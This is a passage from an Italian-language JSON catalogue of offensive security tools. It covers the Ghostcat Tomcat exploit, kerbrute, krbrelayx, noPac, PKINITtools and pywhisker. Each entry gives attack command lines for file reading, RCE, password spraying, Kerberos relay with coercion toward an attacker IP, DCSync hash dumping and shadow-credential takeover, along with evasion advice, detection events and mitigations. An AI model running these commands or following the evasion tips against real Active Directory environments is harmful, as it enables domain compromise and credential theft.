utenti, metriche aziendali o funzionalita di gestione che potrebbero essere utilizzate per attacchi piu profondi.</p><p><strong>Mitigazioni:</strong> Eseguire la verifica con il minimo numero di richieste possibile. Non accedere o scaricare dati personali oltre a quanto necessario per dimostrare la vulnerabilita. Documentare immediatamente il finding e comunicarlo al cliente come critico, suggerendo l'aggiornamento immediato di Next.js alla versione 14.2.25, 15.2.3 o successiva.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Next_js"
    ],
    "notes": null
  },
  {
    "id": "cnvd-2020-10487-tomcat-ajp-lfi",
    "name": "CNVD-2020-10487-Tomcat-Ajp-lfi",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi",
    "desc": "Exploit PoC per vulnerabilità \"Ghostcat\" in Apache Tomcat (AJP connector) che permette lettura file e RCE.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Questo exploit sfrutta la vulnerabilita nota come \"Ghostcat\" (CNVD-2020-10487 / CVE-2020-1938), una falla critica nel connettore AJP (Apache JServ Protocol) di Apache Tomcat. Il protocollo AJP e utilizzato per la comunicazione tra un web server frontend (come Apache HTTP Server o Nginx) e il backend Tomcat, tipicamente sulla porta 8009. La vulnerabilita consiste nel fatto che Tomcat, quando riceve una richiesta AJP, tratta alcuni attributi della richiesta come fidati senza validazione, permettendo a un attaccante di specificare un percorso file arbitrario da includere e processare. Questo consente la lettura di qualsiasi file all'interno della webapp (incluso <code>WEB-INF/web.xml</code> che contiene configurazioni sensibili) e, se il server permette l'upload di file, l'esecuzione di codice remoto tramite l'inclusione di un file JSP caricato dall'attaccante. La vulnerabilita e presente in tutte le versioni di Tomcat fino alla 9.0.30, 8.5.50 e 7.0.99.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Lettura file arbitraria via AJP:</strong> L'exploit invia una richiesta AJP appositamente crafted alla porta 8009 del server Tomcat, specificando attributi <code>javax.servlet.include.request_uri</code>, <code>javax.servlet.include.path_info</code> e <code>javax.servlet.include.servlet_path</code> per forzare l'inclusione e la restituzione del contenuto di qualsiasi file all'interno della directory della webapp. Il file <code>WEB-INF/web.xml</code> e il target primario poiche contiene la configurazione dell'applicazione, inclusi parametri di connessione al database, percorsi di servlet e potenziali credenziali.</p><p><strong>Esecuzione di codice remoto (RCE):</strong> Se il server Tomcat consente l'upload di file (tramite una funzionalita dell'applicazione, PUT method abilitato o directory scrivibile), l'attaccante puo caricare un file con estensione non-JSP (ad esempio .txt o .png) contenente codice JSP malevolo, e poi utilizzare la vulnerabilita AJP per forzare Tomcat a processarlo come JSP, ottenendo l'esecuzione di codice arbitrario sul server con i privilegi del processo Tomcat.</p><p><strong>Compatibilita e affidabilita:</strong> L'exploit funziona su tutte le versioni vulnerabili di Tomcat (6.x, 7.x fino a 7.0.99, 8.x fino a 8.5.50, 9.x fino a 9.0.30) ed e estremamente affidabile poiche sfrutta un comportamento documentato del protocollo AJP piuttosto che un bug di memoria. Non causa crash del servizio e puo essere eseguito ripetutamente senza effetti collaterali.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>L'exploit richiede connettivita diretta alla porta AJP (default 8009) del server Tomcat. In molte configurazioni, questa porta e esposta solo internamente, ma scansioni di rete frequentemente la trovano accessibile dall'esterno per errore di configurazione.</p><pre><code># Lettura del file web.xml della webapp ROOT\npython3 exploit.py -t 192.168.1.100 -p 8009 -f /WEB-INF/web.xml\n\n# Lettura di un file di configurazione Spring Boot\npython3 exploit.py -t 10.0.0.50 -p 8009 -f /WEB-INF/classes/application.properties\n\n# RCE tramite inclusione di file precedentemente uploadato\npython3 exploit.py -t 192.168.1.100 -p 8009 -f /uploads/avatar.txt --rce\n\n# Scansione rapida con nmap per trovare porte AJP aperte\nnmap -sV -p 8009,8019 192.168.1.0/24</code></pre><p>Il primo passo e sempre verificare se la porta 8009 e raggiungibile. In caso affermativo, la lettura di web.xml fornisce informazioni cruciali sulla struttura dell'applicazione e sulle risorse disponibili.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Ghostcat e una delle vulnerabilita piu impattanti nell'ecosistema Java enterprise. E particolarmente rilevante in ambienti corporate dove Tomcat e onnipresente come application server per applicazioni interne (HR, ERP, portali dipendenti). La lettura di <code>application.properties</code> o <code>web.xml</code> espone frequentemente credenziali di database, chiavi API e configurazioni di servizi interni. In scenari di penetration testing interno, la porta 8009 e spesso accessibile dalla rete aziendale e trascurata dagli amministratori che si concentrano solo sulla porta HTTP 8080. La combinazione di lettura file e SSRF tramite AJP permette spesso di ottenere un primo foothold significativo nella rete interna.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il traffico AJP sulla porta 8009 e binario e puo essere monitorato da IDS con firme specifiche per Ghostcat. Le richieste AJP con attributi di inclusione anomali sono riconoscibili da sistemi di analisi del traffico. Tuttavia, in molti ambienti la porta 8009 non e monitorata con la stessa attenzione della porta HTTP.</p><p><strong>Impatto operativo:</strong> L'exploit e non distruttivo e non causa instabilita del servizio. Ogni richiesta AJP viene processata normalmente dal server. Tuttavia, la lettura di file sensibili e un'operazione che, se rilevata, genera immediatamente un incidente di sicurezza. L'RCE tramite inclusione JSP lascia file sul disco e processi nella lista del server.</p><p><strong>Mitigazioni:</strong> Verificare che la porta 8009 sia effettivamente raggiungibile prima di tentare l'exploit per evitare rumore inutile. Limitare la lettura ai soli file necessari per dimostrare l'impatto (web.xml e application.properties). In caso di RCE, utilizzare payload minimali e rimuovere immediatamente ogni artefatto dopo la dimostrazione. Documentare l'accessibilita della porta AJP come finding separato nel report.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Tomcat"
    ],
    "notes": null
  },
  {
    "id": "kerbrute-linux-amd64",
    "name": "kerbrute_linux_amd64",
    "version": "1.0.3",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/ropnop/kerbrute",
    "desc": "Tool Go per enumerazione utenti e password spraying veloce tramite Kerberos Pre-Auth, evitando blocchi account.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Kerbrute</strong> è uno strumento scritto in Go progettato per enumerare account utente validi e testare password in ambienti Active Directory sfruttando il protocollo Kerberos. A differenza degli attacchi tradizionali basati su LDAP o NTLM, Kerbrute interagisce direttamente con il KDC (Key Distribution Center) sulla porta 88, analizzando le risposte alle richieste AS-REQ di pre-autenticazione. Il KDC risponde con errori diversi per utenti inesistenti (<code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code>) rispetto a utenti validi con password errata (<code>KDC_ERR_PREAUTH_FAILED</code>), permettendo di distinguere i due casi senza generare i classici eventi di Logon Failure (4625). Essendo compilato come binario statico Go, non ha dipendenze e funziona su qualsiasi sistema con connettività verso il Domain Controller.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>User Enumeration Stealth:</strong> La modalità <code>userenum</code> invia richieste AS-REQ senza dati di pre-autenticazione per ogni username nella lista. Il KDC rivela l'esistenza dell'utente senza incrementare il contatore di tentativi falliti, rendendo l'operazione invisibile alle policy di lockout. Questo permette di testare migliaia di username in pochi secondi senza rischio di bloccare account legittimi.</p><p><strong>Password Spraying via Kerberos:</strong> La modalità <code>passwordspray</code> testa una singola password contro tutti gli utenti della lista tramite pre-autenticazione Kerberos. A differenza dello spraying via NTLM/LDAP, questo metodo genera eventi 4771 (Kerberos Pre-Auth Failed) invece dei più monitorati 4625, offrendo un profilo di rilevamento inferiore in ambienti dove il logging Kerberos non è configurato in modo granulare.</p><p><strong>Brute Force Mirato:</strong> La modalità <code>bruteuser</code> testa una lista di password contro un singolo utente, utile quando si conosce già un target di alto valore (es. account di servizio con SPN). Il tool gestisce automaticamente la detection del dominio e la risoluzione DNS del DC.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Kerbrute è un binario standalone che non richiede di essere eseguito da una macchina unita al dominio. Necessita solo di connettività di rete verso il Domain Controller sulla porta 88 (Kerberos). Può risolvere automaticamente il DC tramite DNS oppure accettare un indirizzo specifico.</p><pre><code># Enumerazione utenti validi contro il DC\n./kerbrute userenum -d corp.local --dc 10.0.0.1 usernames.txt\n\n# Password spraying con una password comune\n./kerbrute passwordspray -d corp.local --dc 10.0.0.1 valid_users.txt \"Estate2024!\"\n\n# Brute force su singolo utente di servizio\n./kerbrute bruteuser -d corp.local --dc 10.0.0.1 passwords.txt svc_backup\n\n# Enumerazione con output verbose e log su file\n./kerbrute userenum -d corp.local --dc 10.0.0.1 -v -o results.log usernames.txt</code></pre><p>È consigliabile generare la lista di username utilizzando convenzioni aziendali comuni (nome.cognome, n.cognome, iniziale+cognome) combinando nomi raccolti da LinkedIn o OSINT con tool come <code>username-anarchy</code>.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In fase di <strong>Internal Penetration Test</strong>, Kerbrute è tipicamente il primo tool utilizzato in un assessment black-box quando si ha accesso alla rete ma nessuna credenziale. L'enumerazione degli utenti validi permette di costruire una lista pulita su cui poi eseguire password spraying mirato, massimizzando le probabilità di successo con il minimo numero di tentativi.</p><p>Durante operazioni di <strong>Red Teaming</strong>, il vantaggio principale è la discrezione: le richieste Kerberos sono traffico legittimo che si mescola con l'attività normale del dominio, e l'enumerazione non incrementa i contatori di lockout, permettendo di operare sotto il radar dei SOC.</p><p>Per il <strong>Security Auditing</strong>, i Blue Team possono utilizzare Kerbrute per verificare che le policy di password siano rispettate, testando password comuni stagionali (es. \"Primavera2024!\") contro l'intera base utenti e identificando gli account non conformi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Sebbene più discreto di NTLM spraying, Kerbrute genera eventi 4771 (Kerberos Pre-Authentication Failed) sul Domain Controller per ogni tentativo di password fallito. Microsoft Defender for Identity è in grado di correlare volumi anomali di queste richieste e segnalare attività di enumerazione o spraying. Anche soluzioni SIEM con regole specifiche possono rilevare il pattern.</p><p><strong>Impatto operativo:</strong> L'enumerazione utenti non incrementa il contatore di lockout, ma il password spraying sì. Se la policy prevede il blocco dopo N tentativi, è fondamentale testare una sola password per ciclo e attendere il reset della finestra temporale (tipicamente 30 minuti).</p><p><strong>Mitigazioni:</strong> Limitare la velocità delle richieste con il flag di threading. Distribuire lo spraying su più ore o giorni per evitare picchi di eventi correlabili. Se possibile, eseguire il tool da più host diversi per evitare che un singolo IP sorgente generi un volume anomalo di traffico Kerberos verso il DC.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "krbrelayx",
    "name": "krbrelayx",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/dirkjanm/krbrelayx",
    "desc": "Toolkit per attacchi di coercizione e relay Kerberos (LDAP/SMB) per scalare privilegi su Active Directory.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Krbrelayx</strong> è un toolkit sviluppato da Dirk-jan Mollema per eseguire attacchi di relay Kerberos e abusi delle deleghe in ambienti Active Directory. A differenza del più noto NTLM relay, il relay Kerberos sfrutta scenari specifici dove un servizio accetta autenticazione Kerberos da connessioni non firmate, permettendo di inoltrare ticket di autenticazione verso servizi come LDAP o HTTP. Il toolkit include anche strumenti complementari per innescare la coercizione dell'autenticazione (forzare un server a connettersi verso l'attaccante) tramite meccanismi come il PrinterBug (MS-RPRN) o PetitPotam (MS-EFSRPC). Basato su Impacket, rappresenta uno dei tool più avanzati per privilege escalation in ambienti AD moderni dove le mitigazioni classiche (SMB Signing) sono già implementate.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Kerberos Relay:</strong> Il componente principale (<code>krbrelayx.py</code>) funziona come un server che intercetta le autenticazioni Kerberos forzate e le inoltra verso servizi target. Quando un Domain Controller viene forzato ad autenticarsi verso l'attaccante tramite coercizione, il ticket ricevuto può essere rilanciato verso LDAP/LDAPS dello stesso DC per eseguire modifiche ad oggetti AD come la configurazione di Resource-Based Constrained Delegation (RBCD) o la modifica di attributi msDS-AllowedToActOnBehalfOfOtherIdentity.</p><p><strong>Strumenti di Coercizione:</strong> Il toolkit include <code>printerbug.py</code> (sfrutta MS-RPRN SpoolService) e <code>dnsresolver.py</code> per forzare server remoti ad autenticarsi verso un indirizzo IP controllato dall'attaccante. Questi trigger sono essenziali per generare il traffico di autenticazione da intercettare e rilanciare.</p><p><strong>Unconstrained Delegation Abuse:</strong> Include funzionalità per monitorare e catturare TGT (Ticket Granting Tickets) su macchine configurate con Unconstrained Delegation, permettendo di impersonare qualsiasi utente che si autentichi verso quel server, inclusi Domain Admin e account di servizio privilegiati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>L'attacco richiede tipicamente due terminali: uno per il listener relay e uno per il trigger di coercizione. È necessario avere credenziali valide di un utente di dominio (anche non privilegiato) per creare account macchina e innescare la coercizione.</p><pre><code># Step 1: Avvio del listener relay verso LDAPS del DC\npython3 krbrelayx.py -t ldaps://dc01.corp.local --add-computer relaypc --add-computer-password P@ssw0rd\n\n# Step 2: Trigger coercizione PrinterBug (da altro terminale)\npython3 printerbug.py corp.local/user:pass@fileserver.corp.local attacker_ip\n\n# Step 3: Dopo il relay, usare l'account macchina per S4U2Proxy\npython3 getST.py -spn cifs/dc01.corp.local corp.local/relaypc$:P@ssw0rd -impersonate Administrator\n\n# Monitoraggio TGT su host con Unconstrained Delegation\npython3 krbrelayx.py --dump-tickets</code></pre><p>Il successo dell'attacco dipende dalla configurazione del target: il server deve avere il servizio Print Spooler attivo (per PrinterBug) o EFS esposto (per PetitPotam), e LDAP Channel Binding non deve essere abilitato.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In fase di <strong>Privilege Escalation AD</strong>, krbrelayx è lo strumento di riferimento quando le mitigazioni NTLM relay sono già in atto (SMB Signing abilitato, EPA configurato). Permette di scalare da utente standard a Domain Admin sfruttando la catena coercizione → relay → RBCD → S4U2Proxy, una delle tecniche più efficaci contro domini Windows Server 2016+.</p><p>Durante operazioni di <strong>Red Teaming</strong>, la combinazione coercizione + relay è particolarmente potente perché sfrutta funzionalità legittime del sistema operativo (Print Spooler, EFS) piuttosto che vulnerabilità software, rendendo l'attacco difficile da patchare senza disabilitare servizi potenzialmente necessari.</p><p>Per il <strong>Security Assessment</strong>, verificare quali server hanno Print Spooler esposto e quali hanno Unconstrained Delegation configurata permette di identificare i percorsi di escalation più critici nell'infrastruttura.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> La creazione di account macchina (Event 4741) e la modifica dell'attributo msDS-AllowedToActOnBehalfOfOtherIdentity sono indicatori forti monitorati da Microsoft Defender for Identity (MDI). Le chiamate RPC verso il servizio Print Spooler da host non attesi generano alert specifici. Il traffico di coercizione è rilevabile a livello di rete.</p><p><strong>Impatto operativo:</strong> L'attacco non causa disservizi diretti, ma la creazione di account macchina spuri e le modifiche alle deleghe possono alterare la configurazione del dominio. Se l'attacco fallisce, gli artefatti (account macchina) rimangono nel dominio.</p><p><strong>Mitigazioni:</strong> Disabilitare il Print Spooler sui server non necessari. Implementare LDAP Channel Binding e LDAP Signing. Ridurre la quota di Machine Account (ms-DS-MachineAccountQuota) a 0 per impedire agli utenti normali di creare account macchina. Monitorare le modifiche agli attributi di delega con regole SIEM specifiche.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "nopac",
    "name": "noPac",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/Ridter/noPac",
    "desc": "Exploit tool per CVE-2021-42278 e CVE-2021-42287 (sAMAccountName spoofing) che permette Privilege Escalation a Domain Admin.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>NoPac</strong> (noto anche come sam-the-admin) è un tool di exploit che sfrutta la combinazione di due vulnerabilità critiche di Active Directory: CVE-2021-42278 (sAMAccountName Spoofing) e CVE-2021-42287 (KDC Confusion). Queste vulnerabilità permettono a un utente di dominio con privilegi minimi di impersonare un Domain Controller e ottenere accesso come Domain Admin in pochi secondi. L'attacco funziona creando un account macchina, rinominandolo con il nome di un DC (senza il suffisso $), richiedendo un TGT, rinominando l'account al nome originale e infine richiedendo un Service Ticket per il DC. Il KDC, non trovando più l'account con il nome del DC, assegna automaticamente il ticket all'account del DC reale, garantendo privilegi di Domain Admin. Basato su Impacket, è uno degli exploit AD più devastanti della storia recente.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Full Exploit Chain Automatizzata:</strong> Il tool gestisce l'intera catena di attacco in un singolo comando: creazione dell'account macchina, manipolazione del sAMAccountName, richiesta TGT/TGS e ottenimento dell'accesso privilegiato. L'utente non deve eseguire manualmente i singoli step, riducendo la complessità operativa e il tempo di esposizione.</p><p><strong>Shell Interattiva sul DC:</strong> La modalità <code>-shell</code> utilizza il Service Ticket ottenuto per eseguire comandi sul Domain Controller tramite smbexec o psexec, fornendo una shell SYSTEM interattiva. Questo permette di eseguire immediatamente azioni post-exploitation come il dump di NTDS.dit.</p><p><strong>DCSync Integrato:</strong> La modalità <code>-dump</code> esegue automaticamente un attacco DCSync dopo l'exploit, estraendo tutti gli hash NTLM del dominio (incluso l'hash di krbtgt necessario per Golden Ticket) senza dover accedere direttamente al Domain Controller.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>NoPac è uno script Python che richiede Impacket installato. Necessita di credenziali valide di un utente di dominio standard e che la quota di creazione account macchina (ms-DS-MachineAccountQuota) sia maggiore di 0 (default: 10). Il dominio deve essere vulnerabile (non patchato con gli aggiornamenti di novembre 2021).</p><pre><code># Exploit completo con shell SYSTEM sul DC\npython3 noPac.py corp.local/utente:Password123 -dc-ip 10.0.0.1 -shell\n\n# Exploit con dump degli hash del dominio (DCSync)\npython3 noPac.py corp.local/utente:Password123 -dc-ip 10.0.0.1 -dump\n\n# Exploit con uso di hash NTLM (Pass-the-Hash)\npython3 noPac.py corp.local/utente -hashes :aad3b435b51404eeaad3b435b51404ee -dc-ip 10.0.0.1 -shell\n\n# Verifica vulnerabilità senza eseguire l'exploit\npython3 scanner.py corp.local/utente:Password123 -dc-ip 10.0.0.1</code></pre><p>Il repository include anche uno scanner (<code>scanner.py</code>) per verificare se il dominio è vulnerabile senza eseguire effettivamente l'exploit, utile in contesti di assessment dove si vuole documentare la vulnerabilità senza impatti.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In fase di <strong>Internal Penetration Test</strong>, NoPac rappresenta il percorso più rapido per la compromissione totale del dominio quando il target non è patchato. Da un singolo utente standard, si ottiene Domain Admin in meno di 30 secondi, rendendo inutile qualsiasi altra escalation più complessa.</p><p>Durante il <strong>Red Teaming</strong>, la velocità dell'exploit permette di minimizzare il tempo di esposizione: l'intera catena avviene in una singola sessione e lascia meno artefatti rispetto a tecniche multi-step come il relay.</p><p>Per il <strong>Vulnerability Assessment</strong>, lo scanner incluso permette di verificare l'esposizione del dominio alla vulnerabilità e documentarla nel report senza rischi operativi, fornendo evidenza concreta della criticità.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'attacco genera una sequenza di eventi molto riconoscibile: creazione account macchina (4741), modifica del sAMAccountName (4742) due volte in pochi secondi, seguita da richieste Kerberos anomale (4768/4769). Microsoft Defender for Identity rileva specificamente questo pattern con un alert dedicato \"Suspected sAMAccountName impersonation\". Qualsiasi SIEM con regole aggiornate per queste CVE segnalerà l'attività.</p><p><strong>Impatto operativo:</strong> L'exploit crea un account macchina nel dominio che rimane anche dopo l'attacco. L'eventuale DCSync genera traffico di replica significativo. La shell SYSTEM sul DC è rilevabile da EDR.</p><p><strong>Mitigazioni:</strong> Applicare le patch Microsoft di novembre 2021 (KB5008102/KB5008380). Ridurre ms-DS-MachineAccountQuota a 0. Monitorare le modifiche all'attributo sAMAccountName con regole SIEM dedicate. Abilitare Protected Users group per gli account privilegiati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "pkinittools",
    "name": "PKINITtools",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/dirkjanm/PKINITtools",
    "desc": "Toolkit Python per manipolare l'autenticazione Kerberos PKINIT (Certificate-based) e ottenere TGT/NTLM hash.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PKINITtools</strong> è una suite di script Python sviluppata da Dirk-jan Mollema per interagire con il meccanismo di pre-autenticazione Kerberos PKINIT (Public Key Cryptography for Initial Authentication). PKINIT è il protocollo che permette di autenticarsi a Kerberos usando certificati X.509 invece della password, ed è il fondamento di tecnologie come Windows Hello for Business e l'autenticazione smartcard. Il toolkit è diventato essenziale nell'ecosistema di exploitation di Active Directory Certificate Services (ADCS), poiché rappresenta il ponte tra un certificato ottenuto (legittimamente o tramite exploit) e l'accesso effettivo al dominio. Include tre script principali: <code>gettgtpkinit.py</code> per ottenere TGT, <code>getnthash.py</code> per recuperare hash NTLM e <code>gets4uticket.py</code> per S4U2Self.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Autenticazione via Certificato (gettgtpkinit.py):</strong> Permette di richiedere un TGT (Ticket Granting Ticket) al KDC presentando un certificato PFX o PEM con la relativa chiave privata. Questo bypassa completamente la necessità di conoscere la password dell'account, poiché il KDC valida il certificato contro la CA interna e rilascia il ticket. Il TGT viene salvato in formato ccache, utilizzabile con altri tool Impacket per qualsiasi operazione successiva.</p><p><strong>UnPAC the Hash (getnthash.py):</strong> Tecnica avanzata che sfrutta una proprietà del protocollo PKINIT: quando il KDC rilascia un TGT via certificato, include nella risposta i dati della sessione criptati con la chiave derivata dalla password dell'utente. Utilizzando la chiave di sessione AS-REP ottenuta durante l'autenticazione PKINIT, è possibile estrarre l'hash NTLM dell'account senza mai conoscere la password in chiaro. Questo è fondamentale per poi eseguire Pass-the-Hash o DCSync.</p><p><strong>S4U2Self Ticketing (gets4uticket.py):</strong> Permette di richiedere Service Tickets per conto di altri utenti sfruttando la delega Kerberos S4U2Self. Combinato con un TGT ottenuto via PKINIT per un account macchina, consente di impersonare qualsiasi utente del dominio verso servizi specifici, completando la catena di privilege escalation.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>PKINITtools si inserisce nel workflow tipico di exploitation ADCS. Dopo aver ottenuto un certificato tramite tool come Certipy o Certify (sfruttando vulnerabilità ESC1-ESC8), si usa questa suite per convertirlo in accesso effettivo. Richiede Python 3 e la libreria minikerberos.</p><pre><code># Step 1: Ottenere un TGT usando il certificato PFX\npython3 gettgtpkinit.py -cert-pfx admin.pfx -pfx-pass 'password' corp.local/administrator admin.ccache\n\n# Step 2: Recuperare l'hash NTLM dall'AS-REP (UnPAC the Hash)\npython3 getnthash.py -key 5c7de5... corp.local/administrator\n\n# Step 3: S4U2Self per impersonare un utente\npython3 gets4uticket.py kerberos+ccache://corp.local\\\\dc01\\$:admin.ccache@dc01.corp.local cifs/dc01.corp.local@corp.local administrator@corp.local admin_impersonated.ccache\n\n# Uso del TGT con altri tool Impacket\nKRB5CCNAME=admin.ccache python3 secretsdump.py -k -no-pass corp.local/administrator@dc01.corp.local</code></pre><p>La chiave AS-REP necessaria per <code>getnthash.py</code> viene stampata nell'output di <code>gettgtpkinit.py</code> durante la richiesta del TGT. È importante salvarla immediatamente.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In fase di <strong>ADCS Exploitation</strong>, PKINITtools è il componente indispensabile per completare qualsiasi catena di attacco basata su certificati. Dopo aver sfruttato template vulnerabili (ESC1), enrollment endpoint esposti (ESC8) o relay verso la CA (ESC11), il certificato ottenuto deve essere convertito in un TGT utilizzabile, e questo toolkit è lo standard per farlo.</p><p>Per la <strong>Persistence Avanzata</strong>, un certificato valido ha tipicamente una durata di 1-2 anni, molto superiore a quella di un Golden Ticket (legata alla rotazione di krbtgt). Salvare un certificato di un Domain Admin e usare PKINITtools per generare TGT on-demand garantisce accesso persistente al dominio.</p><p>Durante il <strong>Lateral Movement</strong>, la tecnica UnPAC-the-Hash è particolarmente potente perché permette di ottenere l'hash NTLM di qualsiasi account per cui si possiede un certificato valido, abilitando tecniche classiche come Pass-the-Hash senza mai toccare LSASS o NTDS.dit.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'autenticazione PKINIT genera eventi 4768 con il campo PreAuthType impostato a 16 (PKI) invece del consueto 2 (password). Se l'account target non è configurato per l'uso di smartcard o Windows Hello, questo è un indicatore molto forte di attività anomala. Microsoft Defender for Identity rileva specificamente l'uso sospetto di certificati per l'autenticazione.</p><p><strong>Impatto operativo:</strong> L'operazione in sé è non distruttiva e non modifica lo stato dell'account target. Tuttavia, il TGT ottenuto ha gli stessi privilegi dell'account reale, quindi qualsiasi azione successiva (DCSync, lateral movement) sarà loggata normalmente.</p><p><strong>Mitigazioni:</strong> Monitorare gli eventi 4768 con PreAuthType 16 per account che non dovrebbero usare certificati. Implementare policy di Certificate Mapping rigorose sulla CA. Revocare immediatamente i certificati compromessi tramite CRL. Abilitare il logging dettagliato degli eventi ADCS (Event ID 4886, 4887) per tracciare le richieste di certificati anomale.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "pywhisker",
    "name": "pywhisker",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/ShutdownRepo/pywhisker",
    "desc": "Tool Python per sfruttare vulnerabilità \"Shadow Credentials\" (Key Trust Account) in AD e prendere controllo di account utente/computer.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PyWhisker</strong> è un tool Python che sfrutta la tecnica \"Shadow Credentials\" per prendere il controllo di account utente o computer in Active Directory. La tecnica abusa dell'attributo <code>msDS-KeyCredentialLink</code>, introdotto da Microsoft per supportare Windows Hello for Business e l'autenticazione passwordless FIDO2. Questo attributo memorizza le chiavi pubbliche autorizzate ad autenticarsi come l'account tramite PKINIT. Se un attaccante ha permessi di scrittura su questo attributo (ad esempio tramite <code>GenericWrite</code>, <code>GenericAll</code> o <code>WriteProperty</code>), può iniettare una propria chiave pubblica e successivamente usare la chiave privata corrispondente per ottenere un TGT Kerberos come quell'account, senza mai conoscerne o modificarne la password. Sviluppato dal team ShutdownRepo, è il tool di riferimento per questa tecnica.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Shadow Credential Injection:</strong> PyWhisker genera automaticamente una coppia di chiavi RSA (pubblica/privata), crea un certificato self-signed contenente la chiave pubblica e lo inietta nell'attributo <code>msDS-KeyCredentialLink</code> dell'account target tramite query LDAP. La chiave privata viene salvata in un file PFX locale, pronto per l'uso con PKINITtools. L'intera operazione richiede pochi secondi e non genera interruzioni di servizio.</p><p><strong>Gestione Completa delle Credenziali:</strong> Oltre all'iniezione (<code>add</code>), il tool supporta la lista (<code>list</code>), la rimozione (<code>remove</code>) e la pulizia (<code>clear</code>) delle chiavi dall'attributo. Questo è essenziale sia per la pulizia post-operazione in contesti di Red Team che per l'analisi forense da parte dei Blue Team.</p><p><strong>Integrazione con PKINITtools:</strong> Il workflow naturale prevede l'uso di PyWhisker per l'iniezione, seguito da <code>gettgtpkinit.py</code> per ottenere il TGT e <code>getnthash.py</code> per recuperare l'hash NTLM dell'account (tecnica UnPAC-the-Hash). Il tool stampa direttamente il comando da eseguire con PKINITtools, facilitando la catena di attacco.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>PyWhisker richiede credenziali di un utente con permessi di scrittura sull'attributo <code>msDS-KeyCredentialLink</code> del target. Funziona tramite LDAP/LDAPS e supporta autenticazione con password, hash NTLM o ticket Kerberos. Il dominio deve avere AD CS configurato (almeno una Enterprise CA) per validare i certificati PKINIT.</p><pre><code># Iniezione Shadow Credential su account target\npython3 pywhisker.py -d corp.local -u attaccante -p Password123 -t victim_admin --action add\n\n# Autenticazione con il PFX generato (usando PKINITtools)\npython3 gettgtpkinit.py -cert-pfx victim_admin.pfx -pfx-pass randompass corp.local/victim_admin victim.ccache\n\n# Recupero hash NTLM\npython3 getnthash.py -key 5c7de5... corp.local/victim_admin\n\n# Elenco Shadow Credentials esistenti su un account\npython3 pywhisker.py -d corp.local -u attaccante -p Password123 -t victim_admin --action list\n\n# Pulizia post-operazione (rimuovi la chiave iniettata)\npython3 pywhisker.py -d corp.local -u attaccante -p Password123 -t victim_admin --action remove -D device_id</code></pre><p>È fondamentale salvare il DeviceID stampato durante l'iniezione per poter rimuovere la chiave specifica durante la fase di cleanup.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In fase di <strong>Privilege Escalation</strong>, quando BloodHound rivela che un utente compromesso ha permessi di scrittura (<code>GenericWrite</code>, <code>GenericAll</code>, <code>WriteDacl</code>) su un account privilegiato (Domain Admin, account di servizio con SPN), PyWhisker trasforma quel permesso in compromissione totale dell'account target in modo silenzioso e senza resettarne la password.</p><p>Per la <strong>Persistence Stealth</strong>, la tecnica Shadow Credentials è tra le più discrete disponibili: non modifica la password dell'account, non crea nuovi oggetti AD, non altera i gruppi e l'attributo 